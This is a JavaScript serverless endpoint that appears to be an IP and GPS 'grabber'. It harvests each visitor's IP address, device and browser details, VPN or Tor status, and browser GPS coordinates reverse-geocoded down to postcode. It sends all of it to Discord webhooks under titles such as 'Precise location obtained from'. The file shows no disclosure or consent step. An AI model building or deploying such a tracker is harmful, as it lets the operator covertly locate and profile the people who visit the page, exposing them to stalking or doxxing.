// api/log.js - Fixed user agent handling

const fetch = require('node-fetch');

export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const API_KEY = process.env.BIGDATACLOUD_API_KEY;
    const IP_DISCORD_WEBHOOK = process.env.IP_DISCORD_WEBHOOK;
    const GPS_DISCORD_WEBHOOK = process.env.GPS_DISCORD_WEBHOOK;
    
    if (!API_KEY) {
      return res.status(500).json({ error: 'API key not configured' });
    }
    
    const { gpsCoordinates } = req.body;
    
    // Get client IP (use X-Forwarded-For if behind proxy)
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                    req.headers['x-real-ip'] || 
                    req.connection.remoteAddress;
    
    // Get user agent from headers (if from browser) or from request body
    const userAgent = req.body.userAgent || req.headers['user-agent'] || 'Unknown';
    
    console.log(`Processing request - IP: ${clientIP}, User Agent: ${userAgent.substring(0, 100)}...`);
    
    // Get all data in parallel
    const [ipGeoData, userAgentData, riskData] = await Promise.all([
      // IP Geolocation
      fetch(`https://api-bdc.net/data/ip-geolocation-full?key=${API_KEY}&ip=${clientIP}`).then(r => r.json()),
      
      // User Agent Info - CORRECTED URL
      fetch(`https://api-bdc.net/data/user-agent-info?key=${API_KEY}&userAgentRaw=${encodeURIComponent(userAgent)}`).then(r => r.json()),
      
      // Risk Data
      fetch(`https://api-bdc.net/data/user-risk?key=${API_KEY}`).then(r => r.json())
    ]);
    
    // Log the user agent data for debugging
    console.log('User Agent API Response:', JSON.stringify(userAgentData, null, 2));
    
    // Prepare IP data for Discord
    const ipEmbed = createIPEmbed(ipGeoData, userAgentData, riskData, clientIP, userAgent);
    
    // Send IP webhook to Discord
    let ipWebhookResult = { sent: false, error: null };
    if (IP_DISCORD_WEBHOOK && !IP_DISCORD_WEBHOOK.includes('YOUR_')) {
      ipWebhookResult = await sendDiscordWebhook(IP_DISCORD_WEBHOOK, {
        embeds: [ipEmbed]
      });
    }
    
    let gpsResponse = null;
    let gpsWebhookResult = { sent: false, error: null };
    
    // If GPS coordinates provided
    if (gpsCoordinates && gpsCoordinates.latitude && gpsCoordinates.longitude) {
      const reverseGeoData = await fetch(
        `https://api-bdc.net/data/reverse-geocode-with-timezone?latitude=${gpsCoordinates.latitude}&longitude=${gpsCoordinates.longitude}&key=${API_KEY}`
      ).then(r => r.json());
      
      // Prepare GPS data for Discord
      const gpsEmbed = createGPSEmbed(reverseGeoData, gpsCoordinates, clientIP, userAgent);
      
      // Send GPS webhook to Discord
      if (GPS_DISCORD_WEBHOOK && !GPS_DISCORD_WEBHOOK.includes('YOUR_')) {
        gpsWebhookResult = await sendDiscordWebhook(GPS_DISCORD_WEBHOOK, {
          embeds: [gpsEmbed]
        });
      }
      
      gpsResponse = {
        gpsData: prepareGPSWebhookData(reverseGeoData, gpsCoordinates)
      };
    }
    
    // Return response to client
    res.status(200).json({
      success: true,
      message: 'Data processed successfully',
      webhooks: {
        ip: ipWebhookResult,
        gps: gpsWebhookResult
      },
      ipData: prepareIPWebhookData(ipGeoData, userAgentData, riskData, clientIP, userAgent),
      gpsData: gpsResponse?.gpsData || null
    });
    
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ 
      error: 'Internal server error',
      message: error.message,
      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
    });
  }
}

// Function to send Discord webhook
async function sendDiscordWebhook(webhookUrl, data) {
  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error(`Discord webhook failed: ${response.status} ${response.statusText}`, errorText);
      return { sent: false, error: `HTTP ${response.status}: ${errorText.substring(0, 100)}` };
    }
    
    console.log('Discord webhook sent successfully');
    return { sent: true };
  } catch (error) {
    console.error('Discord webhook error:', error);
    return { sent: false, error: error.message };
  }
}

// Create Discord embed for IP data
function createIPEmbed(ipGeoData, userAgentData, riskData, clientIP, rawUserAgent) {
  const location = ipGeoData.location || {};
  const country = ipGeoData.country || {};
  const network = ipGeoData.network || {};
  const hazard = ipGeoData.hazardReport || {};
  const carriers = network.carriers || [];
  
  // Get ASN and Organization from first carrier
  const primaryCarrier = carriers[0] || {};
  
  // Format coordinates
  const coords = location.latitude && location.longitude 
    ? `${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`
    : 'Not available';
  
  // Format security info
  const securityStatus = hazard.isKnownAsVpn ? '🔴 VPN' : 
                        hazard.isKnownAsProxy ? '🟡 Proxy' : 
                        hazard.isKnownAsTorServer ? '🔴 Tor' : 
                        '🟢 Clean';
  
  const riskColor = riskData.risk === 'High' ? 0xFF0000 : 
                   riskData.risk === 'Medium' ? 0xFFA500 : 
                   0x00FF00;
  
  // Truncate raw user agent if too long for Discord
  const truncatedRawUA = rawUserAgent.length > 500 
    ? rawUserAgent.substring(0, 497) + '...' 
    : rawUserAgent;
  
  // Prepare user agent info from API response
  const uaDevice = userAgentData.device || 'Unknown';
  const uaOS = userAgentData.os || 'Unknown';
  const uaParsed = userAgentData.userAgent || 'Unknown';
  const uaIsMobile = userAgentData.isMobile ? '✅ Yes' : '❌ No';
  const uaIsBot = userAgentData.isSpider ? '✅ Yes' : '❌ No';
  const uaFamily = userAgentData.family || 'Unknown';
  
  return {
    title: '🌐 IP Geolocation Data',
    description: `Data collected for ${clientIP}`,
    color: riskColor,
    timestamp: new Date().toISOString(),
    fields: [
      {
        name: '📌 Location',
        value: `**Country:** ${country.name || 'N/A'}
**Region:** ${location.principalSubdivision || 'N/A'}
**City:** ${location.city || location.localityName || 'N/A'}
**Coordinates:** ${coords}
**Timezone:** ${location.timeZone?.ianaTimeId || 'N/A'}
**Local Time:** ${location.timeZone?.localTime || 'N/A'}
**Confidence:** ${ipGeoData.confidence || 'N/A'}`,
        inline: true
      },
      {
        name: '🔧 Network',
        value: `**IP:** ${ipGeoData.ip || clientIP}
**ASN:** ${primaryCarrier.asn || 'N/A'}
**Organization:** ${primaryCarrier.organisation || 'N/A'}
**Carrier:** ${network.organisation || 'N/A'}
**Registry:** ${network.registry || 'N/A'}
**Bogon:** ${hazard.isBogon ? '✅ Yes' : '❌ No'}`,
        inline: true
      },
      {
        name: '🛡️ Security',
        value: `**Status:** ${securityStatus}
**Threat Level:** ${ipGeoData.securityThreat || 'Unknown'}
**VPN:** ${hazard.isKnownAsVpn ? '✅ Yes' : '❌ No'}
**Proxy:** ${hazard.isKnownAsProxy ? '✅ Yes' : '❌ No'}
**Tor:** ${hazard.isKnownAsTorServer ? '✅ Yes' : '❌ No'}
**Hosting:** ${hazard.isHostingAsn ? '✅ Yes' : '❌ No'}
**Cellular:** ${hazard.isCellular ? '✅ Yes' : '❌ No'}`,
        inline: true
      },
      {
        name: '👤 User Agent - Raw',
        value: `\`\`\`${truncatedRawUA}\`\`\``,
        inline: false
      },
      {
        name: '📱 User Agent - Parsed',
        value: `**Device:** ${uaDevice}
**OS:** ${uaOS}
**Browser/Family:** ${uaFamily} ${userAgentData.versionMajor ? `v${userAgentData.versionMajor}` : ''}${userAgentData.versionMinor ? `.${userAgentData.versionMinor}` : ''}
**Parsed UA:** ${uaParsed}
**Mobile:** ${uaIsMobile}
**Bot:** ${uaIsBot}
**Risk Level:** ${riskData.risk || 'N/A'}`,
        inline: false
      }
    ],
    footer: {
      text: 'IP Geolocation Tracker • BigDataCloud API'
    }
  };
}

// Create Discord embed for GPS data
function createGPSEmbed(reverseGeoData, gpsCoordinates, clientIP, rawUserAgent) {
  const timeZone = reverseGeoData.timeZone || {};
  
  // Truncate raw user agent
  const truncatedRawUA = rawUserAgent.length > 300 
    ? rawUserAgent.substring(0, 297) + '...' 
    : rawUserAgent;
  
  return {
    title: '📍 GPS Location Data',
    description: `Precise location obtained from ${clientIP}`,
    color: 0x00FF00, // Green color
    timestamp: new Date().toISOString(),
    fields: [
      {
        name: '🎯 Precise Location',
        value: `**Coordinates:** ${gpsCoordinates.latitude.toFixed(6)}, ${gpsCoordinates.longitude.toFixed(6)}
**Accuracy:** ${gpsCoordinates.accuracy ? `${Math.round(gpsCoordinates.accuracy)}m` : 'Direct GPS'}`,
        inline: false
      },
      {
        name: '🏙️ Address Details',
        value: `**Country:** ${reverseGeoData.countryName || 'N/A'}
**Region:** ${reverseGeoData.principalSubdivision || 'N/A'}
**City:** ${reverseGeoData.city || 'N/A'}
**Locality:** ${reverseGeoData.locality || 'N/A'}
**Postcode:** ${reverseGeoData.postcode || 'N/A'}
**Continent:** ${reverseGeoData.continent || 'N/A'}`,
        inline: true
      },
      {
        name: '🕒 Time Information',
        value: `**Timezone:** ${timeZone.ianaTimeId || 'N/A'}
**Local Time:** ${timeZone.localTime || 'N/A'}
**UTC Offset:** ${timeZone.utcOffset || 'N/A'}
**DST:** ${timeZone.isDaylightSavingTime ? '✅ Active' : '❌ Not active'}`,
        inline: true
      },
      {
        name: '👤 User Agent',
        value: `\`\`\`${truncatedRawUA}\`\`\``,
        inline: false
      }
    ],
    footer: {
      text: 'GPS Reverse Geocode • BigDataCloud API'
    }
  };
}

// Original data preparation functions
function prepareIPWebhookData(ipGeoData, userAgentData, riskData, clientIP, rawUserAgent) {
  const location = ipGeoData.location || {};
  const country = ipGeoData.country || {};
  const network = ipGeoData.network || {};
  const hazard = ipGeoData.hazardReport || {};
  const carriers = network.carriers || [];
  const primaryCarrier = carriers[0] || {};
  
  return {
    'IP Address (ip)': ipGeoData.ip || clientIP,
    'Continent (continent)': location.continent || 'N/A',
    'Country (name)': country.name || 'N/A',
    'Region (principalSubdivision)': location.principalSubdivision || 'N/A',
    'City (city)': location.city || location.localityName || 'N/A',
    'Locality (localityName)': location.localityName || 'N/A',
    'Post Code (postcode)': location.postcode || 'N/A',
    'Coordinates (latitude & longitude)': location.latitude && location.longitude 
      ? `${location.latitude}, ${location.longitude}` 
      : 'N/A',
    'Timezone (ianaTimeId)': location.timeZone?.ianaTimeId || 'N/A',
    'Localtime (localTime)': location.timeZone?.localTime || 'N/A',
    'ASN (asn inside carriers)': primaryCarrier.asn || 'N/A',
    'Organization (organisation inside carriers)': primaryCarrier.organisation || 'N/A',
    'Confidence (confidence)': ipGeoData.confidence || 'N/A',
    'Security Threat (securityThreat)': ipGeoData.securityThreat || 'N/A',
    'VPN (isKnownAsVpn)': hazard.isKnownAsVpn ? 'Yes' : 'No',
    'Proxy (isKnownAsProxy)': hazard.isKnownAsProxy ? 'Yes' : 'No',
    'Tor (isKnownAsTorServer)': hazard.isKnownAsTorServer ? 'Yes' : 'No',
    'Hosting ASN (isHostingAsn)': hazard.isHostingAsn ? 'Yes' : 'No',
    'Cellular Network (isCellular)': hazard.isCellular ? 'Yes' : 'No',
    'Risk (risk)': riskData.risk || 'N/A',
    'User Agent Raw': rawUserAgent || 'N/A',
    'Device (device)': userAgentData.device || 'N/A',
    'OS (os)': userAgentData.os || 'N/A',
    'Browser Family': userAgentData.family || 'N/A',
    'Browser Version': userAgentData.versionMajor ? `v${userAgentData.versionMajor}` : 'N/A',
    'Mobile (isMobile)': userAgentData.isMobile ? 'Yes' : 'No',
    'Bot (isSpider)': userAgentData.isSpider ? 'Yes' : 'No'
  };
}

function prepareGPSWebhookData(reverseGeoData, gpsCoordinates) {
  const timeZone = reverseGeoData.timeZone || {};
  
  return {
    'Source': 'gps_reverse_geocode',
    'IP Address (ip)': 'GPS-based - Not applicable',
    'Continent (continent)': reverseGeoData.continent || 'N/A',
    'Country (name)': reverseGeoData.countryName || 'N/A',
    'Region (principalSubdivision)': reverseGeoData.principalSubdivision || 'N/A',
    'City (city)': reverseGeoData.city || 'N/A',
    'Locality (locality)': reverseGeoData.locality || 'N/A',
    'Post Code (postcode)': reverseGeoData.postcode || 'N/A',
    'Coordinates (latitude & longitude)': `${reverseGeoData.latitude}, ${reverseGeoData.longitude}`,
    'Timezone (ianaTimeId)': timeZone.ianaTimeId || 'N/A',
    'Localtime (localTime)': timeZone.localTime || 'N/A',
    'ASN (asn inside carriers)': 'GPS-based - Not applicable',
    'Organization (organisation inside carriers)': 'GPS-based - Not applicable',
    'Confidence (confidence)': 'High (GPS)',
    'GPS Accuracy': 'Direct GPS coordinates',
    'GPS Source': 'Browser geolocation API'
  };
  }
